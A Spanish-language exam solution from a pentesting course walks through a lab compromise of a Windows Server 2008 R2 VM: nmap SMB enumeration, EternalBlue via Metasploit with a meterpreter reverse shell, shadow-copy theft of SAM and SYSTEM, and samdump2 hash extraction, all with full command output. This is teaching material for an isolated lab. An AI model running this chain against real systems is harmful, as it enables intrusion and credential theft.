---
title: Examen Parcial - Solución de Pregunta 2 
date: 2024-11-01 06:20:00 -0500
categories: [Cybersecurity,Ethical Hacking,Pentesting,Exploitation Techniques]
tags: [Examen Parcial, evaluation]     # TAG names should always be lowercase
---

<!-- <hr style="border: none; height: 10px; background-color: #003b00;" />

# <font color="#87CEEB">Examen Parcial.</font>

<hr style="border: none; height: 10px; background-color: #003b00;" /> -->

## 0. Preliminares

### 0.1. En la máquina Metasploitable 3

- Asegúrese de tener la máquina virtual en modo Nat Network.

- Asegúrese de tener el Firewall de Windows **desactivado**.

- Instalar el servicio `File Manager`.

### 0.2. En la máquina Kali Linux

- Asegúrese de tener la máquina virtual en modo Nat Network.

### 0.3. Setup del laboratorio

- El setup es como se muestra en la figura:

![alt text](/assets/images/setup-lab.png)

## 1. Pregunta 1 (8 puntos).

- Link de cuestionario: [Cuestionario](https://forms.gle/6bN8Yxf9RF3DEzbJ7)


## 2. Pregunta 2 (12 puntos).

  _**Eres un auditor de seguridad que tiene la tarea de realizar un pentesting sobre un servidor de una empresa que ejecuta Windows Server 2008 R2. Este servidor tiene habilitado el servicio SMBv1, y tu objetivo es identificar vulnerabilidades, explotar el servicio SMB para obtener acceso y luego exfiltrar los archivos SAM y SYSTEM. Siguiendo los pasos a continuación, documenta tu procedimiento y las herramientas empleadas.**_

### Instrucciones:

### 2.1. Escaneo de Red y Enumeración de Servicios (2 puntos)

- Utiliza **Nmap** desde tu máquina atacante para descubrir servicios activos en la máquina objetivo. Debes identificar los puertos relacionados con **SMB** y verificar si **SMBv1** está habilitado.

- **Tip**: Investiga cuáles son los 02 puertos asociados con el servicio **SMB**. Luego, investiga como puedes usar `nmap` con el flag `--script` para una enumeración detallada. Al analizar el output del comando, buscar específicamente el término **SMBv1** o el protocolo **NT LM 0.12** en la lista de protocolos. Ello indicará la presencia del servicio **SMBv1**.

- Escribe el comando que usaste en Nmap y explica brevemente cómo determina si SMBv1 está activo.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">Solución</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- En un inicio, normalmente deberíamos hacer un escaneo a la red `sudo nmap -sn 10.0.2.0/24` para identificar todos los elementos de la red:

  ```bash
  sudo nmap -sn 10.0.2.0/24
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:19 PST
  Nmap scan report for 10.0.2.1
  Host is up (0.00015s latency).
  MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
  Nmap scan report for 10.0.2.2
  Host is up (0.00013s latency).
  MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
  Nmap scan report for 10.0.2.3
  Host is up (0.00020s latency).
  MAC Address: 08:00:27:A7:A0:C8 (Oracle VirtualBox virtual NIC)
  Nmap scan report for 10.0.2.15
  Host is up (0.00042s latency).
  MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)
  Nmap scan report for 10.0.2.9
  Host is up.
  Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds
  ```

  - `10.0.2.1`: virtual router implementado por VirtualBox
  - `10.0.2.2`: virtual DNS server implementado por VirtualBox
  - `10.0.2.3`: virtual DHCP server implementado por VirtualBox
  - `10.0.2.15`: target
  - `10.0.2.9`: Kali Linux

- Normalmente, tendríamos que escanear los puertos de todos los elementos de la red. Sin embargo, por los límites de tiempo del examen, sabemos que el target es la ip address `10.0.2.15`. 

- Aquí podemos hacer diferentes escaneos. 
  - Un escaneo agresivo:

  ```bash
  sudo nmap -A -p 139,445 10.0.2.15
  [sudo] password for user: 
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:45 PST
  Nmap scan report for 10.0.2.15
  Host is up (0.00058s latency).

  PORT    STATE SERVICE      VERSION
  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
  445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
  MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Microsoft Windows 7|2008|8.1
  OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
  OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
  Network Distance: 1 hop
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

  Host script results:
  |_nbstat: NetBIOS name: VAGRANT-2008R2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:9b:22:24 (Oracle VirtualBox virtual NIC)
  | smb2-security-mode: 
  |   2:1:0: 
  |_    Message signing enabled but not required
  |_clock-skew: mean: 2h40m00s, deviation: 4h37m07s, median: 0s
  | smb2-time: 
  |   date: 2024-11-04T16:45:51
  |_  start_date: 2024-11-04T16:01:05
  | smb-os-discovery: 
  |   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
  |   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
  |   Computer name: vagrant-2008R2
  |   NetBIOS computer name: VAGRANT-2008R2\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2024-11-04T08:45:51-08:00
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)

  TRACEROUTE
  HOP RTT     ADDRESS
  1   0.58 ms 10.0.2.15

  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.73 seconds
  ```
  
  - O un escaneo para verificar la versión y, por consecuencia, la existencia del servicio en cuestión

  ```bash
  sudo nmap -sV -p 139,445 10.0.2.15
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:49 PST
  Nmap scan report for 10.0.2.15
  Host is up (0.00037s latency).

  PORT    STATE SERVICE      VERSION
  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
  445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
  MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
  ```
  - Y, una vez confirmada la presencia del servicio SMBv1 -como fue sugerido en la pregunta-, usar el script `smb-protocolos` (previa investigación en google) 

  ```bash
  sudo nmap --script=smb-protocols -p 139,445 10.0.2.15
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:57 PST
  Nmap scan report for 10.0.2.15
  Host is up (0.00042s latency).

  PORT    STATE SERVICE
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds
  MAC Address: 08:00:27:9B:22:24 (Oracle VirtualBox virtual NIC)

  Host script results:
  | smb-protocols: 
  |   dialects: 
  |     NT LM 0.12 (SMBv1) [dangerous, but default]
  |     2:0:2
  |_    2:1:0

  Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
  ```

  - En este último escaneo, podemos ver que el script acusa que el servicio SMBv1 tienen una configuración por defecto, potencialmente susceptible a la explotación conocida como **EternalBlue**.


### 2.2. Exploración de la Vulnerabilidad (2 puntos)

- Utiliza los resultados del escaneo para identificar si el servicio SMBv1 presenta alguna vulnerabilidad conocida. Indica si el servidor es vulnerable al exploit EternalBlue (MS17-010).

- **Tip**: Para explotar esta vulnerabilidad, usa el framework Metasploit y selecciona el módulo específico `exploit/windows/smb/ms17_010_eternalblue`, con el objetivo de establecer una conexión reverse shell hacia la máquina atacante.

- Explica brevemente el funcionamiento del script `exploit/windows/smb/ms17_010_eternalblue` y por qué se selecciona este módulo en particular para obtener acceso remoto.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">Solución</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- Iniciamos el framework Metasploit:

```bash
┌──(user㉿kali)-[~]
└─$ msfconsole -q                                        
msf6 > 
```

- Invocamos el módulo exploit sugerido:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

- Aquí la pregunta específicamente pide explicar brevemente el funcionamiento del script `exploit/windows/smb/ms17_010_eternalblue `. Aquí el script localizado en el repositorio Github de Rapid7 (creadores de Metasploit): [Link](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb)

- Explicación (ChatGPT 3.5):

<pre style="white-space: pre-wrap; word-wrap: break-word;">
Objetivo del Script

El objetivo principal de este módulo es explotar una vulnerabilidad en SMBv1 en sistemas Windows vulnerables, permitiendo a un atacante remoto ejecutar código arbitrario al corromper la memoria del kernel. Este exploit aprovecha un fallo en el controlador srvnet.sys, abusando del protocolo SMB para obtener ejecución de código remoto con privilegios elevados en la máquina objetivo.

Principales Funciones y su Interrelación

1. Inicialización y Configuración del Objetivo
- El script comienza configurando los parámetros del objetivo, especificando las posibles versiones de Windows (como Windows 7, Server 2008 R2, y otras).

- La función initialize define opciones para que el usuario ajuste los parámetros del exploit, como SMBUser, SMBPass, y SMBDomain, en caso de que se requiera autenticación.

2. Kernel Pool Grooming
- La fase clave del exploit EternalBlue es la preparación de la memoria (kernel pool grooming).

- Las funciones smb1_free_hole, smb1_large_buffer y smb2_grooms son usadas para asignar y liberar grandes cantidades de memoria en el nonpaged pool del sistema objetivo. Esto crea condiciones específicas de memoria que permiten controlar la ubicación en la cual el exploit sobrescribirá la memoria.

- Este proceso de preparación asegura que el buffer srvnet (que es el objetivo del exploit) puede ser sobrescrito de manera precisa.

3. Ejecución del Exploit e Inyección del Payload

- El exploit se ejecuta enviando paquetes SMB diseñados para provocar un buffer overflow en la función Srv!SrvOs2FeaToNt.
- La función exploit_eb inicia el payload principal, inyectando el código malicioso en la memoria del objetivo al explotar una falla en la manera en que Windows procesa las solicitudes SMB.

- Montaje del Payload: Esto se realiza con make_kernel_user_payload para preparar el shellcode, y create_fea_list, que crea la lista FEA (File Extended Attribute) usada en el paquete SMB para entregar el payload.

4. Ejecución del Shellcode

- Después de la preparación de la memoria (pool grooming), el payload (shellcode) se despliega modificando los headers SMB y buffers específicos.
- El código intenta desactivar la protección NX (No Execute) y coloca cuidadosamente el shellcode para que se ejecute en la región de memoria controlada por el atacante.
- Las funciones send_trans2_second y send_big_trans2 son fundamentales para enviar los paquetes SMB que sobrescriben el buffer srvnet y desactivan las protecciones NX, permitiendo así la ejecución remota de código.

5. Gestión de la Sesión y Reintentos del Exploit

- La función exploit_eb incluye mecanismos de reintento (MaxExploitAttempts) para manejar casos en los que el exploit pueda no tener éxito en el primer intento debido a condiciones de memoria inestables.

- Funciones como smb1_anonymous_connect_ipc y smb1_connect_ipc establecen una sesión inicial con el objetivo a través de los shares IPC$, conexión que es necesaria para enviar los paquetes SMB requeridos para explotar el objetivo.

- Resumen del Flujo del Exploit
1. Configuración del Objetivo: Se definen opciones como el sistema operativo, credenciales, y parámetros SMB.

2. Preparación de la Memoria (Kernel Pool Grooming): Se inunda el nonpaged pool con paquetes SMB para preparar la memoria.

3. Ejecución del Exploit: Se desencadena el buffer overflow en Srv!SrvOs2FeaToNt para corromper la memoria.

4. Inyección de Shellcode: El shellcode desactiva NX, coloca estructuras falsas y obtiene ejecución de código.

5. Lógica de Reintentos: Se intenta la explotación múltiples veces debido a la inestabilidad de las condiciones de memoria.

6. Activación de Shell: Se establece exitosamente una conexión reverse shell o una sesión Meterpreter.
</pre>


### 2.3. Configuración del Exploit en el Framework Metasploit (2 puntos)

- Configura el exploit mencionado anteriormente, especificando los parámetros necesarios, como las direcciones IP del atacante y la víctima.

- **Tip**: Configura los parámetros **RHOSTS** para la IP de la máquina objetivo y **LHOST** para tu máquina atacante. Estos son esenciales para establecer la conexión.

- **Tip adicional**: También debes configurar el **payload** para el reverse shell. Busca en el metasploit un payload (que ya anteriormente hemos usado en clase) para obtener un reverse shell connection.

- Explica brevemente cada parámetro crítico que configuraste, como **LHOST** y **RHOSTS**, y justifica por qué esos valores son importantes para el ataque.


<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">Solución</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.2.15
RHOSTS => 10.0.2.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.2.9
LHOST => 10.0.2.9
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
LPORT => 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.0.2.15        yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                             oit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.9         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.
```

- Usamos el payload `windows/x64/meterpreter/reverse_tcp` para implementar una conexión TCP reversa desde el target hacia la máquina atacante.
- El RHOSTS es la máquina target `10.0.2.15`.
- El LHOST es la máquina atacante `10.0.2.9`.
- El LPORT es el puerto local en la máquina atacante que estará abierto a la escucha de la solicitud de conexión TCP reversa originada en el target.

### 2.4. Ejecución del Exploit (2 puntos)

- Ejecuta el exploit para obtener una **conexión Meterpreter** con el servidor. Si la explotación es exitosa, documenta qué mensaje o salida te confirma que la conexión ha sido establecida.

- **Tip**: Al ejecutar el exploit, Metasploit intentará establecer una sesión Meterpreter en la máquina víctima si el ataque es exitoso.

- **Tip adicional**: Documenta cualquier mensaje en la salida de Metasploit que indique éxito, como `Meterpreter session X` opened. Esto confirma la conexión.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">Solución</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />


```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.0.2.9:4444 
[*] 10.0.2.15:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.15:445         - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.15:445         - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.15:445 - The target is vulnerable.
[*] 10.0.2.15:445 - Connecting to target for exploitation.
[+] 10.0.2.15:445 - Connection established for exploitation.
[+] 10.0.2.15:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.2.15:445 - CORE raw buffer dump (51 bytes)
[*] 10.0.2.15:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.0.2.15:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 10.0.2.15:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 10.0.2.15:445 - 0x00000030  6b 20 31                                         k 1             
[+] 10.0.2.15:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.2.15:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.2.15:445 - Sending all but last fragment of exploit packet
[*] 10.0.2.15:445 - Starting non-paged pool grooming
[+] 10.0.2.15:445 - Sending SMBv2 buffers
[+] 10.0.2.15:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.2.15:445 - Sending final SMBv2 buffers.
[*] 10.0.2.15:445 - Sending last fragment of exploit packet!
[*] 10.0.2.15:445 - Receiving response from exploit packet
[+] 10.0.2.15:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.15:445 - Sending egg to corrupted connection.
[*] 10.0.2.15:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.0.2.15
[+] 10.0.2.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.0.2.9:4444 -> 10.0.2.15:50496) at 2024-11-04 09:33:42 -0800

meterpreter > 

```

- Obtener una sesión Meterpreter en la máquina objetivo significa que el atacante ha logrado establecer una conexión de control remoto con el sistema comprometido utilizando la herramienta Meterpreter, la cual forma parte del framework de 

- **Qué es Meterpreter y su Significado en el Contexto del Ataque**
  - Meterpreter es un payload avanzado desarrollado por Metasploit que permite el control de un sistema de forma sigilosa y modular. Cuando el exploit es exitoso, Meterpreter se carga en la memoria del sistema objetivo sin tocar el disco, lo que dificulta su detección por herramientas de seguridad tradicionales como antivirus o IDS (Sistemas de Detección de Intrusiones).

- **Capacidades que Proporciona una Sesión Meterpreter**
  - Obtener una sesión Meterpreter permite al atacante realizar una variedad de acciones maliciosas en la máquina objetivo, incluyendo:

  - **Navegar por el sistema de archivos**: Acceso completo al sistema de archivos, permitiendo ver, copiar, mover o eliminar archivos.
  - **Ejecutar comandos**: Permite ejecutar comandos del sistema de forma remota en la máquina objetivo.
  - **Captura de información sensible**: Como contraseñas y hashes de contraseñas, así como realizar capturas de pantalla y activar micrófonos o cámaras si están disponibles.
  - **Escalada de privilegios**: Meterpreter incluye módulos que permiten buscar y explotar vulnerabilidades locales para elevar los privilegios del usuario actual, permitiendo acceso como administrador o SYSTEM.
  - **Pivoting y movimiento lateral**: El atacante puede usar la máquina comprometida como punto de apoyo para atacar otras máquinas en la red interna del objetivo.
  - **Exfiltración de datos**: Posibilita la transferencia de archivos desde el sistema objetivo al atacante, facilitando el robo de información.

### 2.5. Exfiltración de Archivos SAM y SYSTEM (2 puntos)

- Utilizando la sesión de Meterpreter establecida, explica los pasos para infiltrar un script o herramienta que te permita crear una copia de volumen de sombra (Volume Shadow Copy) de la unidad principal (C:) del servidor.

- Link de descarga del archivo `vssown.vbs`: [Descargar archivo](/assets/files/vssown.vbs)

- Describe brevemente cómo utilizarías esta copia de sombra para acceder a los archivos **SAM** y **SYSTEM**. Enumera los comandos necesarios en Meterpreter o la shell de Windows para:

  - Crear la copia de sombra.
  - Copiar los archivos SAM y SYSTEM a un directorio accesible.
  - Descargar los archivos a tu máquina atacante.

- **Tip**: Utiliza el enlace de descarga proporcionado para obtener el script `vssown.vbs` e infíltralo en la máquina víctima usando Meterpreter.

- **Tip adicional**: Después de ejecutar el script `vssown.vbs`, toma nota de la ubicación de la **copia de volumen de sombra** que se crea (ruta similar a `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX`).

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">Solución</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- **Aquí viene una parte muy interesante. Muchos alumnos han subido el archivo `vssown.vbs` al target utilizando el servicio ssh (vía comando `scp`). Sin embargo, parte de la resolución de esta parte del laboratorio, era investigar cómo podían subir aquel archivo usando la sesión meterpreter. Recordar que ya tienen una conexión establecida entre el atacante y el target con el meterpreter. Por lo tanto, no es necesario hacer uso de otro tipo de conexión.**

- Se debió haber utilizado el siguiente comando: 

  ```bash
  meterpreter > upload /home/user/Downloads/vssown.vbs C:\\Users\\vagrant\\vssown.vbs
  [*] Uploading  : /home/user/Downloads/vssown.vbs -> C:\Users\vagrant\vssown.vbs
  [*] Uploaded 8.54 KiB of 8.54 KiB (100.0%): /home/user/Downloads/vssown.vbs -> C:\Users\vagrant\vssown.vbs
  [*] Completed  : /home/user/Downloads/vssown.vbs -> C:\Users\vagrant\vssown.vbs
  ```
- La ruta destino es indiferente pues la sesión meterpreter ya concede privilegios necesarios para correr cualquier script.

- A continuación, toda la secuencia para realizar la extracción de los archivos `SAM` y `SYSTEM` usando la sesión meterpreter.

- Primero, invocamos una sesión `shell`:

```bash
meterpreter > shell
Process 5236 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

- Por facilidad, vamos a la ruta donde copiamos el archivo `vssown.vbs`:

```bash
C:\Windows\system32>cd C:\Users\vagrant\         
cd C:\Users\vagrant\

C:\Users\vagrant>ls
ls
AppData
Application Data
Contacts
Cookies
Desktop
Documents
Downloads
.
.
.
vssown.vbs

C:\Users\vagrant>
```

- Como paso opcional, los alumnos deben haber investigado el uso del script `vssown.vbs`. En primer, lugar, por ejemplo, podían eliminar cualquier copia shadow del volumen `C` que ya existiese, simplemente por facilitar la tarea de identificar la nueva copia shadow.

- Listar, borrar, y verificar nuevamente la lista de copias shadow.

```bash
C:\Users\vagrant>cscript vssown.vbs /list
cscript vssown.vbs /list
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

SHADOW COPIES
=============

[*] ID:                  {2AB51C31-A93D-4F81-9596-0F7045E96FDD}
[*] Client accessible:   True
[*] Count:               1
[*] Device object:       \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
[*] Differential:        True
[*] Exposed locally:     False
[*] Exposed name:        
[*] Exposed remotely:    False
[*] Hardware assisted:   False
[*] Imported:            False
[*] No auto release:     True
[*] Not surfaced:        False
[*] No writers:          True
[*] Originating machine: vagrant-2008R2
[*] Persistent:          True
[*] Plex:                False
[*] Provider ID:         {B5946137-7B9F-4925-AF80-51ABD60B20D5}
[*] Service machine:     vagrant-2008R2
[*] Set ID:              {9D5F48C4-0B60-4C76-B47E-97A018A6E1CB}
[*] State:               12
[*] Transportable:       False
[*] Volume name:         \\?\Volume{3aefe34c-7b16-11e7-a4cb-806e6f6e6963}\


C:\Users\vagrant>cscript vssown.vbs /delete {2AB51C31-A93D-4F81-9596-0F7045E96FDD}
cscript vssown.vbs /delete {2AB51C31-A93D-4F81-9596-0F7045E96FDD}
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

[*] Attempting to delete shadow copy with ID: {2AB51C31-A93D-4F81-9596-0F7045E96FDD}

C:\Users\vagrant>cscript vssown.vbs /list
cscript vssown.vbs /list
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

SHADOW COPIES
=============
```

- Iniciar una copia de volumen shadow:

```bash
C:\Users\vagrant>cscript vssown.vbs /start
cscript vssown.vbs /start
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

[*] Signal sent to start the VSS service.

C:\Users\vagrant>
```

- Crear una copia del volumen shadow `C`.

```bash
C:\Users\vagrant>cscript vssown.vbs /create C
cscript vssown.vbs /create C
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

[*] Attempting to create a shadow copy.

C:\Users\vagrant>cscript vssown.vbs /list
cscript vssown.vbs /list
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

SHADOW COPIES
=============

[*] ID:                  {DFCE99C3-795F-44C9-B890-7A99CEE3919C}
[*] Client accessible:   True
[*] Count:               1
[*] Device object:       \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
[*] Differential:        True
[*] Exposed locally:     False
[*] Exposed name:        
[*] Exposed remotely:    False
[*] Hardware assisted:   False
[*] Imported:            False
[*] No auto release:     True
[*] Not surfaced:        False
[*] No writers:          True
[*] Originating machine: vagrant-2008R2
[*] Persistent:          True
[*] Plex:                False
[*] Provider ID:         {B5946137-7B9F-4925-AF80-51ABD60B20D5}
[*] Service machine:     vagrant-2008R2
[*] Set ID:              {C9382E56-36B3-4995-B4C4-FC2E59161B8E}
[*] State:               12
[*] Transportable:       False
[*] Volume name:         \\?\Volume{3aefe34c-7b16-11e7-a4cb-806e6f6e6963}\
```

- Copiamos los dos archivos target `SAM` y `SYSTEM` en una ruta de fácil acceso (Por ejemplo: `C:\Users\vagrant` o `C:\Windows\Temp`)

```bash
C:\Users\vagrant>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\Users\vagrant
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\Users\vagrant
        1 file(s) copied.

C:\Users\vagrant>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Users\vagrant
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\Users\vagrant
        1 file(s) copied.
```

- (Opcional) Verificamos la presencia de `SAM` y `SYSTEM` en nuestra actual ruta.

```bash
C:\Users\vagrant>ls -lh SAM SYSTEM
ls -lh SAM SYSTEM
-rwxrwxr-x+ 1 SYSTEM SYSTEM 256K Nov  4 08:00 SAM
-rwxrwxr-x+ 1 SYSTEM SYSTEM 7.5M Nov  4 09:50 SYSTEM
```

- Similar a la forma que utilizamos el comando `upload` del meterpreter para subir el archivo `vssown.vbs`, esta vez utilizamos el comando `download` para descargar en el Kali las copias de los archivos `SAM` y `SYSTEM` que están en la copia del volumen shadow `C` recientemente creado. La sintaxis es `download ruta_origen_en_el_target ruta_destino_en_el_atacante`.

```bash
meterpreter > download C:\\Users\\vagrant\\SAM /home/user/Downloads
[*] Downloading: C:\Users\vagrant\SAM -> /home/user/Downloads/SAM
[*] Downloaded 256.00 KiB of 256.00 KiB (100.0%): C:\Users\vagrant\SAM -> /home/user/Downloads/SAM
[*] Completed  : C:\Users\vagrant\SAM -> /home/user/Downloads/SAM

meterpreter > download C:\\Users\\vagrant\\SYSTEM /home/user/Downloads
[*] Downloading: C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 1.00 MiB of 7.50 MiB (13.33%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 2.00 MiB of 7.50 MiB (26.67%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 3.00 MiB of 7.50 MiB (40.0%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 4.00 MiB of 7.50 MiB (53.33%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 5.00 MiB of 7.50 MiB (66.67%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 6.00 MiB of 7.50 MiB (80.0%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 7.00 MiB of 7.50 MiB (93.33%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Downloaded 7.50 MiB of 7.50 MiB (100.0%): C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
[*] Completed  : C:\Users\vagrant\SYSTEM -> /home/user/Downloads/SYSTEM
```

- En otra terminal, en el Kali Linux, podemos verificar la existencia de los archivos `SAM` y `SYSTEM` en nuestro `home/user/Downloads` en nuestro Kali Linux.

```bash
┌──(user㉿kali)-[~]
└─$ ls -lh /home/user/Downloads/SAM
-rwxr-x--- 1 user user 256K Nov  4 08:00 /home/user/Downloads/SAM
                                                                                                                     
┌──(user㉿kali)-[~]
└─$ ls -lh /home/user/Downloads/SYSTEM
-rwxr-x--- 1 user user 7.5M Nov  4 09:50 /home/user/Downloads/SYSTEM
```

- Una vez que tenemos los archivos target exfiltrados, procedemos al siguiente paso que es el crackeo de dichos archivos.

### 2.6. Análisis de los Archivos Exfiltrados (2 puntos)

- Una vez que hayas descargado los archivos **SAM** y **SYSTEM**, describe el procedimiento que seguirías en tu máquina atacante para extraer los hashes de contraseñas. Especifica qué herramientas emplearías para realizar esta tarea.

- **Tip**: Una vez descargados los archivos SAM y SYSTEM a tu máquina Kali Linux, usa herramientas como `samdump2` para extraer los hashes.

- **Tip adicional**: Con los hashes extraídos, puedes intentar descifrarlos con herramientas como **John the Ripper** o **Hashcat**.

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">Solución</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

- Extrae los Hashes de los Archivos SAM y SYSTEM

```bash
samdump2 SYSTEM SAM > hashes.txt
```

